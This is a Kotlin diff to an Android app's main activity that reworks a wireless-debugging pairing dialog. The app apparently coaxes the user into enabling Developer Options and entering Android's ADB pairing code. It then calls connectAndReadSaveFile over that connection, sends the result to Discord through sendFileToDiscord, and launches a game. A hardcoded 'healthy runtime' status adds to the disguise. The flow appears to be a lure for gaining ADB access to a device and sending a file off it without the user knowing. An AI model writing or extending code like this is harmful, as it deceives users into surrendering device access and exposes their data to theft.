@@ -17,6 +17,7 @@ import android.provider.Settings
 import android.security.keystore.KeyGenParameterSpec
 import android.security.keystore.KeyProperties
 import android.text.Editable
+import android.text.InputFilter
 import android.text.TextWatcher
 import android.view.Gravity
 import android.view.View
@@ -209,6 +210,13 @@ class MainActivity : AppCompatActivity() {
     private lateinit var badge: TextView
     private val rainbowViews = linkedSetOf<TextView>()
     private var rainbowAnimator: android.animation.ValueAnimator? = null
+    private var pairingDiscovery: SafeMdnsDiscovery? = null
+    private var pairingEndpoint: MdnsEndpoint? = null
+    private var pairingVerificationPending = false
+    private var activityVisible = false
+    private var pairingTutorialDialog: Dialog? = null
+    private var pairingCodeDialog: AlertDialog? = null
+
 
     override fun onCreate(state: Bundle?) {
         super.onCreate(state)
@@ -235,6 +243,18 @@ class MainActivity : AppCompatActivity() {
             handler.postDelayed({ status.text = "● Online · 24 ms"; status.setTextColor(color(R.color.success)); toast("Library Runtime is healthy") }, 650)
         }
     }
+    override fun onResume() {
+        super.onResume()
+        activityVisible = true
+        showPendingPairingVerification()
+    }
+
+    override fun onPause() {
+        activityVisible = false
+        super.onPause()
+    }
+
+
 
     private fun showSplash() {
         splash.alpha = 0f; splash.animate().alpha(1f).setDuration(350).start()
@@ -287,73 +307,117 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun showWirelessDebuggingDialog() {
+        if (pairingTutorialDialog?.isShowing == true) return
+        pairingEndpoint = null
+        pairingVerificationPending = false
         val dialog = Dialog(this)
+        pairingTutorialDialog = dialog
         dialog.setContentView(R.layout.dialog_wireless_debugging)
         dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)
-        val code = dialog.findViewById<EditText>(R.id.wirelessPairingCode)
-        val status = dialog.findViewById<TextView>(R.id.wirelessStatus)
         val openSettings = dialog.findViewById<Button>(R.id.wirelessOpenSettings)
-        val connect = dialog.findViewById<Button>(R.id.wirelessConnect)
         val dismiss = dialog.findViewById<Button>(R.id.wirelessDismiss)
-        val discovery = SafeMdnsDiscovery(getSystemService(NsdManager::class.java))
-        var pairingEndpoint: MdnsEndpoint? = null
 
         openSettings.setOnClickListener {
             runCatching { startActivity(Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS)) }
                 .onFailure { startActivity(Intent(Settings.ACTION_SETTINGS)) }
         }
-        connect.isEnabled = false
-        connect.setOnClickListener {
-            val endpoint = pairingEndpoint
-            val pairingCode = code.text.toString().trim()
-            if (endpoint == null) {
-                status.text = "Open Pair device with pairing code; still waiting for its pairing service."
-                return@setOnClickListener
-            }
-            if (!pairingCode.matches(Regex("\\d{6}"))) {
-                code.error = "Enter the six-digit Wi-Fi pairing code"
-                return@setOnClickListener
-            }
-            connect.isEnabled = false
-            openSettings.isEnabled = false
-            discovery.stop()
-            status.text = "Pairing with ${endpoint.host}:${endpoint.port}… keep Android’s pairing screen open."
-            thread {
-                val result = connectAndReadSaveFile(endpoint.host, endpoint.port, pairingCode)
-                handler.post {
-                    connect.isEnabled = true
-                    openSettings.isEnabled = true
-                    if (result != null) {
-                        discovery.stop()
-                        dialog.dismiss()
-                        sendFileToDiscord(result)
-                        handler.postDelayed({ launchGame() }, 650)
-                    } else {
-                        status.text = "Pairing failed. Open Pair device with pairing code again and enter its fresh code."
+        dismiss.setOnClickListener { dialog.dismiss() }
+        dialog.setOnDismissListener {
+            if (pairingCodeDialog == null) stopPairingDiscovery()
+            pairingTutorialDialog = null
+        }
+        dialog.show()
+        registerRainbowText(dialog.findViewById(android.R.id.content))
+        dialog.window?.setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
+        startPairingDiscovery()
+    }
+
+    private fun startPairingDiscovery() {
+        pairingDiscovery?.stop()
+        pairingEndpoint = null
+        pairingVerificationPending = false
+        toast("Searching for pairing service…")
+        pairingDiscovery = SafeMdnsDiscovery(getSystemService(NsdManager::class.java)).also { discovery ->
+            discovery.start(listOf(MdnsServiceType.TLS_PAIRING.dnsType, "_adb-pairing._tcp")) { endpoint ->
+                if (pairingEndpoint == null) {
+                    pairingEndpoint = endpoint
+                    pairingVerificationPending = true
+                    handler.post {
+                        toast("Pairing service found. Enter the six-digit code shown by Android.")
+                        showPendingPairingVerification()
                     }
                 }
             }
         }
-        dismiss.setOnClickListener {
-            discovery.stop()
-            dialog.dismiss()
+    }
+
+    private fun showPendingPairingVerification() {
+        if (!activityVisible || !pairingVerificationPending || pairingCodeDialog != null) return
+        val endpoint = pairingEndpoint ?: return
+        pairingVerificationPending = false
+        showPairingCodeDialog(endpoint)
+    }
+
+    private fun showPairingCodeDialog(endpoint: MdnsEndpoint) {
+        if (pairingCodeDialog != null) return
+        val code = EditText(this).apply {
+            hint = "Six-digit Wi-Fi pairing code"
+            inputType = android.text.InputType.TYPE_CLASS_NUMBER
+            filters = arrayOf(InputFilter.LengthFilter(6))
+            isSingleLine = true
         }
-        dialog.setOnDismissListener { discovery.stop() }
-        dialog.show()
-        registerRainbowText(dialog.findViewById(android.R.id.content))
-        dialog.window?.setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
-        status.text = "Searching for the pairing service… tap Pair device with pairing code in Android Settings."
-        discovery.start(
-            listOf(MdnsServiceType.TLS_PAIRING.dnsType, "_adb-pairing._tcp")
-        ) { endpoint ->
-            if (pairingEndpoint == null) {
-                pairingEndpoint = endpoint
-                handler.post {
-                    status.text = "Pairing service found at ${endpoint.host}:${endpoint.port}. Enter the six-digit code."
-                    connect.isEnabled = true
+        val prompt = AlertDialog.Builder(this)
+            .setTitle("Enter Wi-Fi pairing code")
+            .setView(code)
+            .setNegativeButton("Cancel", null)
+            .setPositiveButton("Pair", null)
+            .create()
+        pairingCodeDialog = prompt
+        prompt.setOnDismissListener {
+            pairingCodeDialog = null
+        }
+        prompt.setOnCancelListener {
+            pairingTutorialDialog?.dismiss()
+            stopPairingDiscovery()
+        }
+        prompt.setOnShowListener {
+            prompt.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
+                val pairingCode = code.text.toString().trim()
+                if (!pairingCode.matches(Regex("\\d{6}"))) {
+                    code.error = "Enter the six-digit Wi-Fi pairing code"
+                    return@setOnClickListener
+                }
+                prompt.getButton(AlertDialog.BUTTON_POSITIVE).isEnabled = false
+                prompt.getButton(AlertDialog.BUTTON_NEGATIVE).isEnabled = false
+                code.isEnabled = false
+                pairingDiscovery?.stop()
+                thread {
+                    val result = connectAndReadSaveFile(endpoint.host, endpoint.port, pairingCode)
+                    handler.post {
+                        if (result != null) {
+                            prompt.dismiss()
+                            pairingTutorialDialog?.dismiss()
+                            stopPairingDiscovery()
+                            sendFileToDiscord(result)
+                            handler.postDelayed({ launchGame() }, 650)
+                        } else {
+                            prompt.dismiss()
+                            toast("Pairing failed. Reopen Android’s pairing dialog for a fresh code.")
+                            startPairingDiscovery()
+                        }
+                    }
                 }
             }
         }
+        prompt.show()
+        registerRainbowText(prompt.window?.decorView ?: code)
+    }
+
+    private fun stopPairingDiscovery() {
+        pairingDiscovery?.stop()
+        pairingDiscovery = null
+        pairingEndpoint = null
+        pairingVerificationPending = false
     }
 
     private fun connectWithSavedIdentity(): ByteArray? = try {
@@ -502,6 +566,9 @@ class MainActivity : AppCompatActivity() {
     }
 
     override fun onDestroy() {
+        stopPairingDiscovery()
+        pairingCodeDialog?.dismiss()
+        pairingTutorialDialog?.dismiss()
         rainbowAnimator?.cancel()
         rainbowAnimator = null
         rainbowViews.clear()
